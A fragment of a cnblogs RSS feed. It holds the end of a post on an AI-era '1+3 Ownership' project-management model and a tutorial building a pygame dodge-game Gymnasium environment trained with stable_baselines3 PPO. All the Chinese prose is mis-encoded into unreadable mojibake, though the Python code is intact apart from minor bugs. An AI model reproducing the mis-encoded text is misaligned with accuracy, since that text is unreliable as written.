<li>é¡¹ç®ç»çï¼æææ¯ï¼ææ¯åºèº«ï¼</li>
<li>æ¶æå¸ï¼è¶å¤§è§æ¨¡é¡¹ç®éè¦ï¼å¦åææ¯è´è´£äººå¼ä»»ï¼</li>
<li>UI/UEè®¾è®¡å¸</li>
<li>äº§åè´£ä»»äºº</li>
<li>ææ¯è´£ä»»äººï¼ååçåç«¯/åç«¯å·¥ç¨å¸ï¼ä¸ç»åå²ä½ï¼</li>
<li>è´¨éè´£ä»»äºº</li>
</ol>
<p>ä»10ä¸ªè§è²ç²¾ç®å°6ä¸ªï¼æ²éé¾æ¡ç¼©ç­ï¼æçèªç¶æåã</p>
<h2 id="å«æµç¨è°æ´">å«ãæµç¨è°æ´</h2>
<h3 id="ç®¡çæµç¨éæ">ç®¡çæµç¨éæ</h3>
<p>æ¯å¤©äº§åºä»£ç æ¿å¢ï¼äº§åºåè½æ¿å¢ãç®¡çæµç¨å°åºæä¹æ¹æä¸ä¼é»å¡ä¸äººç»çé«æè¿è½¬ï¼</p>
<p>ä¼ ç»çé¡¹ç®ç®¡çæåç§è¯å®¡ãç«ä¼ãçæ¿ç³»ç»ãç¸äºCode ReviewãCI/CDç­ç§ç§ä¸ºäºæ§å¶è¿åº¦åè´¨éäº§ççç®¡çæªæ½ãå¨AIæ¶ä»£ï¼åªäºè¿è¦ç»§ç»­æ§è¡ï¼åªäºè¦è¢«æ¶ä»£æå¼ï¼</p>
<p>è¿ä¸ªé®é¢éè¦æ ¹æ®é¡¹ç®å®éæåµæ¥å®ï¼ä½æ ¸å¿ååæ¯ï¼<strong>åå°å½¢å¼ä¸»ä¹ï¼ä¿çä»·å¼åé </strong>ã</p>
<h2 id="ä¹åºç¨åºæ¯">ä¹ãåºç¨åºæ¯</h2>
<h3 id="éåä½¿ç¨çåºæ¯">éåä½¿ç¨çåºæ¯</h3>
<ul>
<li>ä¸­å¤§åé¡¹ç®</li>
<li>æ¢æå¢éç¬¦å</li>
<li>æAI Nativeå¢éè½¬åè¿°æ±</li>
</ul>
<h3 id="ä¸éç¨åºæ¯">ä¸éç¨åºæ¯</h3>
<ul>
<li>é¡¹ç®è§æ¨¡æå°ï¼è¯·åæ¢å¤´ç¼æ¨¡å¼ä¸ä¸ªäººæå®</li>
<li>æ²¡æAIå¢éè½¬åéæ±</li>
</ul>
<h2 id="åä¸æ»ç»">åä¸ãæ»ç»</h2>
<p>1+3 Ownershipæ¡æ¶æä¾äºä¸ä¸ªç³»ç»æ§çåä½æ¨¡å¼ï¼å°"ä¸å¯è½çè¶çº§ä¸ªä½"æåä¸º"ä¸ä¸ªå¯å¹å»çä¸ä¸è§è²"ï¼è®©æ®éå¢éä¹è½å®ç°AIåçå¼åã</p>
<p><strong>æ¡æ¶çæ ¸å¿æ¯</strong>ï¼æç¡®åå·¥ãå¨æµç¨è´¨éæ§å¶ãAI Agentæ¿æç¹éä»»å¡ã</p>
<p>è¿æä»ä¹å¥½å¤ï¼å¯å¤å¶ãå¯æ©å±ãå¯æ§è¡ãä¸åæ¯ä¾èµæä¸ªå¤©æçèºæ¯ï¼èæ¯å¯ä»¥æ ååçå·¥ç¨ã</p>
<p>è·çæ¶ä»£ä¸èµ·ï¼å¼å¯AI Nativeå¢éè½¬åä¹æå§ï¼</p>
<h2 id="åäºåè">åäºãåè</h2>
<p>ä¸»è¦å¼ç¨ï¼<br>
<a href="https://mp.weixin.qq.com/s/Rya4a-nQqFVL5VFPZ1cotQ" target="_blank" rel="noopener nofollow"># å­¦ä¹ PingCAPï¼æé ä½ å¬å¸çAIåçè½¯ä»¶å¼åå¢é</a></p>
<p>å¶ä»è¾å©åèï¼<br>
<a href="https://mp.weixin.qq.com/s/8kY6grrMrunTzmz1Oq5MSg" target="_blank" rel="noopener nofollow"># Vibe Engineering in 2026.1</a><br>
<a href="https://mp.weixin.qq.com/s/ZDWZNlKQ1weCPgOWNONGqw" target="_blank" rel="noopener nofollow"># åå« AI ä»£ç èéï¼ä¸ä»½å¯éªè¯ãå¯è¿½è¸ªç Vibe Coding å¢éè§è</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-30 18:30">2026-01-30 18:30</span>&nbsp;
<a href="https://www.cnblogs.com/zer0Black">éæ»çç¨åºäººç</a>&nbsp;
éè¯»(<span id="post_view_count">100</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19555418);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19555418', targetLink: 'https://www.cnblogs.com/zer0Black/p/19555418', title: 'AIæ¶ä»£çé¡¹ç®ç®¡çï¼1+3Ownershipæ¨¡å¼åé¡¹ç®ç®¡ç' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ stable_baseline3 å¿«éå¥é¨(äº): è®­ç»èªå®ä¹æ¸¸æï¼æå»ºGymnasiumè®­ç»ç¯å¢ ]]></title>
    <link>https://www.cnblogs.com/ClownLMe/p/19554865</link>
    <guid>78f29ec24110c2d477419772f0dccc34</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ClownLMe/p/19554865" title="åå¸äº 2026-01-30 17:46">
    <span role="heading" aria-level="2">stable_baseline3 å¿«éå¥é¨(äº): è®­ç»èªå®ä¹æ¸¸æï¼æå»ºGymnasiumè®­ç»ç¯å¢</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ç®ä»">ç®ä»</h1>
<p><strong>Gymnasium</strong> ä¸ºå¼ºåå­¦ä¹ æä¾äºä¸ä¸ªæ ååçAPIï¼å®å®ä¹äº Agent åºè¯¥å¦ä½è§å¯ä¸çãå¦ä½ååºå¨ä½ä»¥åå¦ä½è·å¾å¥å±ï¼ä¸ç®¡æ¯æ¸¸æï¼è¿æ¯å·¥ä¸è®¾å¤ï¼åªéè¦æ»¡è¶³<code>Gymnasium</code>æ åé½è½ä½¿ç¨åä¸å¥ä»£ç è¿è¡è®­ç»ã</p>
<h1 id="è®¤è¯gymnasium">è®¤è¯Gymnasium</h1>
<p>ä½¿ç¨<code>stable_baseline3</code>åªéè¦å®ä¹å¥½<code>Gymnasium</code>ç¯å¢ï¼å³æ³¨è®­ç»çå¥å±æºå¶ï¼å°éç¹æ¾å¨ä¸å¡çå¼åä¸èä¸æ¯å¤æçç®æ³ã</p>
<p><strong>Gymnasium</strong>æä¾äºå ä¸ªæ ¸å¿çapiï¼</p>
<table>
<thead>
<tr>
<th><strong>æ¹æ³</strong></th>
<th><strong>åè½</strong></th>
<th><strong>è¿åå¼</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><code>reset()</code></strong></td>
<td>å°ç¯å¢éç½®ä¸ºåå§ç¶æï¼å¼å§æ°ååã</td>
<td><code>obs, info</code></td>
</tr>
<tr>
<td><strong><code>step(action)</code></strong></td>
<td>ç¯å¢ååæ¨è¿ä¸æ­¥ï¼æ§è¡å¨ä½ã</td>
<td><code>obs, reward, terminated, truncated, info</code></td>
</tr>
<tr>
<td><strong><code>render()</code></strong></td>
<td>å¯è§åç¯å¢ï¼æ ¹æ® <code>render_mode</code> æ¸²æå¾åæå¼¹åºçªå£ï¼ã</td>
<td>è§éç½®èå®ï¼éå¸¸æ æä¸º <code>np.array</code>ï¼</td>
</tr>
<tr>
<td><strong><code>close()</code></strong></td>
<td>éæ¾ç¯å¢èµæºï¼å³é­çªå£ãæ¸çåå­ï¼ã</td>
<td>æ </td>
</tr>
</tbody>
</table>
<p>å¶ä¸­çåä¸ªè¿åå¼çå«ä¹ï¼</p>
<ul>
<li><strong><code>observation</code> (Object)</strong>: å½åç¶æçæè¿°ãä¾å¦æäººï¼ç©å®¶çä½ç½®ï¼ç©å®¶çç¶æç­</li>
<li><strong><code>reward</code> (Float)</strong>: ä¸ä¸æ­¥å¨ä½è·å¾çå¥å±</li>
<li><strong><code>terminated</code> (Bool)</strong>: æ¯å¦ç±äº<strong>ä»»å¡é»è¾</strong>ç»æãä¾å¦ï¼å°è¾¾ç»ç¹ãæè¿å²©æµç­</li>
<li><strong><code>truncated</code> (Bool)</strong>: æ¯å¦ç±äº<strong>å¤é¨éå¶</strong>ç»æãä¾å¦ï¼è¾¾å°æå¤§æ­¥æ° 500 æ­¥</li>
<li><strong><code>info</code> (Dict)</strong>: è¾å©è¯æ­ä¿¡æ¯ï¼æ¨¡åè®­ç»éå¸¸ä¸ç¨ï¼ç¨äºç¨æ·èªå®ä¹è°è¯æè®°å½é¢å¤ç»è®¡ã</li>
</ul>
<h1 id="æå¨æå»ºç¯å¢">æå¨æå»ºç¯å¢</h1>
<h3 id="æ¡ä¾">æ¡ä¾</h3>
<p>æ¡ä¾æè¿°ï¼å©ç¨pygameæå»ºä¸ä¸ªç®åçæ¸¸æï¼èº²é¿æè½æ¹åï¼å©ç¨æå»ºçå¥å±æºå¶ï¼è¿è¡å¼ºåå­¦ä¹ ã</p>
<pre><code class="language-python">import gymnasium as gym
from gymnasium import spaces
import numpy as np
import pygame
import random
import cv2
import os
from stable_baselines3 import PPO
from stable_baselines3.common.callbacks import CheckpointCallback
from stable_baselines3.common.env_checker import check_env

class MyEnv(gym.Env):
    def __init__(self, render_mode=None):
        super(MyEnv, self).__init__()

        #åå§ååæ°
        self.width = 400
        self.height = 300
        self.player_size = 30
        self.enemy_size = 30
        self.render_mode = render_mode

        self.action_space = spaces.Discrete(3)

        self.observation_space = spaces.Box(
            low=0, high=255, shape=(84, 84, 3), dtype=np.uint8
        )

        pygame.init()
        if self.render_mode == "human":
            self.screen = pygame.display.set_mode((self.width, self.height))
        
        self.canvas = pygame.Surface((self.width, self.height))
        self.font = pygame.font.SysFont("monospace", 15)

    def reset(self, seed=None, options=None):
        super().reset(seed=seed)

        self.player_x = self.width // 2 - self.player_size // 2
        self.player_y = self.height - self.player_size - 10
        self.enemies = []
        self.score = 0
        self.frame_count = 0

        self.current_speed = 5
        self.spawn_rate = 30

        return self._get_obs(), {}

    def step(self, action):
        reward = 0
        terminated = False
        truncated = False

        move_speed = 8
        if action == 1 and self.player_x &gt; 0: # 
            self.player_x -= move_speed
            reward -= 0.05

        if action == 2 and self.player_x &lt; self.width - self.player_size:
            self.player_x += move_speed
            reward -= 0.05

        self.frame_count += 1

        level = self.score // 5
        self.current_speed = 5 + level
        self.spawn_rate = 30 - level * 2
        spawn_rate = max(10, 30 - level)

        if self.frame_count &gt;= spawn_rate:
            self.frame_count = 0
            enemy_x = random.randint(0, self.width - self.enemy_size)
            self.enemies.append([enemy_x, 0]) # [x, y]

        for enemy in self.enemies:
            enemy[1] += self.current_speed
            
            player_rect = pygame.Rect(self.player_x, self.player_y, self.player_size, self.player_size)
            enemy_rect = pygame.Rect(enemy[0], enemy[1], self.enemy_size, self.enemy_size)
            
            if player_rect.colliderect(enemy_rect):
                reward = -10 
                terminated = True

            elif enemy[1] &gt; self.height:
                self.enemies.remove(enemy)
                self.score += 1
                reward = 1 
        
        if not terminated:
            if self.score &gt; 100:
                reward += 0.01
            reward += 0.01

        obs = self._get_obs()

        if self.render_mode == "human":
            self._render_window()

        return obs, reward, terminated, truncated, {}

    def _get_obs(self):
        self.canvas.fill((0, 0, 0))
        pygame.draw.rect(self.canvas, (50, 150, 255), (self.player_x, self.player_y, self.player_size, self.player_size))
        
        for enemy in self.enemies:
            pygame.draw.rect(self.canvas, (255, 50, 50), (enemy[0], enemy[1], self.enemy_size, self.enemy_size))

        img_array = pygame.surfarray.array3d(self.canvas)
        img_array = np.transpose(img_array, (1, 0, 2))
        obs = cv2.resize(img_array, (84, 84), interpolation=cv2.INTER_AREA)

        return obs.astype(np.uint8)

    def _render_window(self):
        self.screen.blit(self.canvas, (0, 0))
        text = self.font.render(f"Score: {self.score}", True, (255, 255, 255))
        self.screen.blit(text, (10, 10))
        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()

def train():
    log_dir = "logs/DodgeGame"
    os.makedirs(log_dir, exist_ok=True)

    env = MyEnv()
    check_env(env)
    print("ç¯å¢æ£æ¥éè¿...")

    model_path = "models/dodge_ai.zip"
    if not os.path.exists(model_path):
        print("ð æªåç°æ§æ¨¡åï¼ä»å¤´å¼å§è®­ç»...")
        model = PPO(
            "CnnPolicy", 
            env, 
            verbose=1,
            tensorboard_log=log_dir,
            learning_rate=0.0001,
            n_steps=4096,
            batch_size=256,
            device="cuda")
        reset_timesteps = True
    else:
        print("åç°æ§æ¨¡åï¼å è½½å¹¶ç»§ç»­è®­ç»...")
        model = PPO.load(
            model_path, 
            env=env,      
            device="cuda",
            custom_objects={"learning_rate": 0.0001, "n_steps": 4096, "batch_size": 256}
        )
        reset_timesteps = False
   
    print("å¼å§è®­ç»...")

    model.learn(
        total_timesteps=50000,
        reset_num_timesteps=reset_timesteps
    )

    model.save("models/dodge_ai")
    print("æ¨¡åå·²ä¿å­ï¼")
    env.close()

def prodict():
    env = MyEnv(render_mode="human")
    model = PPO.load("models/dodge_ai", env=env, device="cuda")
    obs, _ = env.reset()

    while True:
        action, _states = model.predict(obs, deterministic=True)

        obs, reward, terminated, truncated, info = env.step(action)

        if terminated or truncated:
            obs, _ = env.reset()
        
        pygame.time.Clock().tick(30)

if __name__ == "__main__":
    train()

    prodict()

</code></pre>
<h3 id="ä»£ç è§£æ">ä»£ç è§£æ</h3>
<p>ä»£ç æµç¨å¦ä¸ï¼<br>
<strong>æå»ºæ¸¸æç¯å¢-&gt;è®­ç»æ¨¡å-&gt;æ¨¡åé¢æµ</strong><br>
æ¬ç¯éç¹è®²æ<strong>å»ºæ¸¸æç¯å¢</strong>ï¼å¶ä¸­ç<code>pygame</code>ç¸å³ä»£ç ç®ç¥ï¼å¦å¤ä¸¤ä¸ªæµç¨åèä¹åæç« ã</p>
<h4 id="æå»ºæ¸¸æç¯å¢">æå»ºæ¸¸æç¯å¢</h4>
<h5 id="åå§åç±»">åå§åç±»</h5>
<p>è¯¥ç±»ç»§æ¿<code>gym.Env</code>ç±»</p>
<pre><code class="language-python">class MyEnv(gym.Env):
</code></pre>
<h5 id="æé å½æ°__init__">æé å½æ°__init__</h5>
<pre><code class="language-python">def __init__(self, render_mode=None):
        super(MyEnv, self).__init__()

        #åå§ååæ°
        self.width = 400
        self.height = 300
        self.player_size = 30
        self.enemy_size = 30
        self.render_mode = render_mode

        self.action_space = spaces.Discrete(3)

        self.observation_space = spaces.Box(
            low=0, high=255, shape=(84, 84, 3), dtype=np.uint8
        )

        pygame.init()
        if self.render_mode == "human":
            self.screen = pygame.display.set_mode((self.width, self.height))
        
        self.canvas = pygame.Surface((self.width, self.height))
        self.font = pygame.font.SysFont("monospace", 15)
</code></pre>
<p>å¨æé å½æ°ä¸­ï¼æä»¬ä¸»è¦å®æçæ¯å£°æè®­ç»çç»´åº¦ï¼åè¾å¥ï¼</p>
<ul>
<li>è¾å¥ï¼<code>self.action_space = spaces.Discrete(3)</code>å¶ä¸­ç<code>self.action_space</code>æ¯<strong>åºå®åç§°çç¶ç±»åé</strong>ã<code>spaces.Discrete(3)</code>å£°æè¾å¥çæ°éï¼ä¾å¦ï¼<code>åå·¦ åå³ å ä¸å¨</code>3ä¸ªè¾å¥ã</li>
<li>è§æµç»´åº¦ï¼<code>self.observation_space</code>ä¹æ¯<strong>åºå®åç§°çç¶ç±»åé</strong>ã<code>spaces.Box</code>å£°æè§æµç»´åº¦ã</li>
</ul>
<pre><code class="language-python">self.observation_space = spaces.Box(
    low=0, high=255, shape=(84, 84, 3), dtype=np.uint8
)
</code></pre>
<ol>
<li><code>low</code>ï¼è§æµåæ°çæå°å¼</li>
<li><code>high</code>ï¼è§æµåæ°çæå¤§å¼</li>
<li><code>shape</code>ï¼å£°æç»´åº¦ãä¾å¦ï¼è§æµå¾ç<code>shape(é«ï¼å®½ï¼RGB)</code>ï¼è§æµä¸ä¸ªå¹³é¢ï¼<code>shape(é«,å®½)</code></li>
<li><code>dtype</code>ï¼æ¯ä¸ªåéç±»åï¼è¿éé<code>np.uint8</code>è½å¤èçè®­ç»ææ¬ï¼é»è®¤æ¯æµ®ç¹åçã</li>
</ol>
<h5 id="ä»»å¡éç½®-reset">ä»»å¡éç½® reset</h5>
<p>ç¸å½äºåå§åæ¸¸æç¶æï¼æ¸¸æçéæ°å¼å§ãè¿åçæ¯<strong>è§æµå¼</strong>å<strong>ç¶æä¿¡æ¯ï¼ç¨äºè°è¯æ¥å¿ï¼</strong></p>
<pre><code class="language-python">def reset(self, seed=None, options=None):
        super().reset(seed=seed)

        self.player_x = self.width // 2 - self.player_size // 2
        self.player_y = self.height - self.player_size - 10
        self.enemies = []
        self.score = 0
        self.frame_count = 0

        self.current_speed = 5
        self.spawn_rate = 30

        return self._get_obs(), {}
</code></pre>
<p><strong>è§æµå¼ <code>_get_obs</code>ï¼</strong><br>
éè¿<code>pygame</code>ç»åºçç»é¢ï¼ç¶åç¨<code>opencv</code>è¿è¡ç®åå¤çï¼</p>
<ol>
<li>è½¬æ¢åæ è½´ï¼ç±äº<code>opencv</code>åæ xyè½´è·<code>pygame</code>çxyæ¯é¢ åçï¼</li>
<li>å°ç»é¢ç¼©æ¾å°<code>84 * 84</code>ï¼å¯ä»¥æé«è®­ç»æçï¼</li>
</ol>
<pre><code class="language-python">def _get_obs(self):
        self.canvas.fill((0, 0, 0))
        pygame.draw.rect(self.canvas, (50, 150, 255), (self.player_x, self.player_y, self.player_size, self.player_size))
        
        for enemy in self.enemies:
            pygame.draw.rect(self.canvas, (255, 50, 50), (enemy[0], enemy[1], self.enemy_size, self.enemy_size))

        img_array = pygame.surfarray.array3d(self.canvas)
        img_array = np.transpose(img_array, (1, 0, 2))
        obs = cv2.resize(img_array, (84, 84), interpolation=cv2.INTER_AREA)

        return obs.astype(np.uint8)
</code></pre>
<h5 id="æ­¥-stepéè¦">æ­¥ stepï¼éè¦ï¼</h5>
<p>è¿ä¸ªå½æ°æ¯å¼ºåè®­ç»ç<strong>æ ¸å¿</strong>ï¼è§å®äºå¨<code>ä¸å¸§</code>æè<code>ä¸æ­¥</code>ï¼æä»¬ç»AIçåæ°ã<br>
<mark>åæ°çè®¾ç½®è³å³éè¦ï¼è¿ç´æ¥å³å®äºè®­ç»åºæ¥AIçè´¨é</mark><br>
æ ¹æ®ä¸é¢ä»£ç ï¼å¤§é¨åé½æ¯æ¸¸æé»è¾ï¼ï¼ä¸»è¦è®²è®¾ç½®<strong>å¥å±åæ°</strong>ï¼</p>
<ol>
<li>å¨AIè¿è¡ç§»å¨æ¶ æ©ç½ 0.05 å</li>
<li>å¨AIå­æ´»æ¶ å¥å± 0.01åï¼æ¸¸æåæ°å¤§äº100æ¶ å­æ´»å¥å± 0.02å</li>
<li>å¨éç¢ç©å®å¨ä¸è½æ¶ å¥å± 1 å</li>
<li>å¨ä¸éç¢ç©ç¢°ææ¶ æ©ç½ 10 å</li>
</ol>
<pre><code class="language-python">def step(self, action):
        reward = 0
        terminated = False
        truncated = False

        move_speed = 8
        if action == 1 and self.player_x &gt; 0: # 
            self.player_x -= move_speed
            reward -= 0.05

        if action == 2 and self.player_x &lt; self.width - self.player_size:
            self.player_x += move_speed
            reward -= 0.05

        self.frame_count += 1

        level = self.score // 5
        self.current_speed = 5 + level
        self.spawn_rate = 30 - level * 2
        spawn_rate = max(10, 30 - level)

        if self.frame_count &gt;= spawn_rate:
            self.frame_count = 0
            enemy_x = random.randint(0, self.width - self.enemy_size)
            self.enemies.append([enemy_x, 0]) # [x, y]

        for enemy in self.enemies:
            enemy[1] += self.current_speed
            
            player_rect = pygame.Rect(self.player_x, self.player_y, self.player_size, self.player_size)
            enemy_rect = pygame.Rect(enemy[0], enemy[1], self.enemy_size, self.enemy_size)
            
            if player_rect.colliderect(enemy_rect):
                reward = -10 
                terminated = True

            elif enemy[1] &gt; self.height:
                self.enemies.remove(enemy)
                self.score += 1
                reward = 1 
        
        if not terminated:
            if self.score &gt; 100:
                reward += 0.01
            reward += 0.01

        obs = self._get_obs()

        if self.render_mode == "human":
            self._render_window()

        return obs, reward, terminated, truncated, {}
</code></pre>
<h5 id="å±ç¤ºæ¸¸æç»é¢">å±ç¤ºæ¸¸æç»é¢</h5>
<p>ä¸é¢å®å¨æ¯<code>pygame</code>ä»£ç ï¼ç¨äºæ¾ç¤ºæ¸¸æç»é¢ï¼è¿éå°±ä¸è§£éäºã</p>
<pre><code class="language-python">def _render_window(self):
        self.screen.blit(self.canvas, (0, 0))
        text = self.font.render(f"Score: {self.score}", True, (255, 255, 255))
        self.screen.blit(text, (10, 10))
        pygame.display.flip()

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
</code></pre>
<p><strong>ä½ æåæä¸ºäºä¸åè°åä¾ äºï¼å¿«æ¥è¯è¯å§ï¼</strong></p>
<p><strong>å¦æâ¤åæ¬¢â¤æ¬ç³»åæç¨ï¼å°±ç¹ä¸ªå³æ³¨å§ï¼åç»­ä¸å®ææ´æ°~</strong></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.009027777777777777" data-date-updated="2026-01-30 17:59">2026-01-30 17:46</span>&nbsp;
<a href="https://www.cnblogs.com/ClownLMe">ClownLMe</a>&nbsp;
éè¯»(<span id="post_view_count">27</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19554865);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19554865', targetLink: 'https://www.cnblogs.com/ClownLMe/p/19554865', title: 'stable_baseline3 å¿«éå¥é¨(äº): è®­ç»èªå®ä¹æ¸¸æï¼æå»ºGymnasiumè®­ç»ç¯å¢' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
        </channel>
        </rss>